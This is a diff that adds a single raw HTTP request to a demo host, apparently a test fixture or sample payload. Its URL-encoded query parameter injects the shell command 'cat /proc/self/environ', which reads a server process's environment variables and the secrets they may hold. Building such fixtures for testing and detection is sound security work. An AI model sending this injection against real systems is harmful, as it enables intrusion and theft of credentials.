@@ -1,0 +1,4 @@
+GET /a?s=%3B%2Bcat%2B%2Fproc%2Fself%2Fenviron HTTP/1.1
+Host: demo.example.com
+Connection: close
+
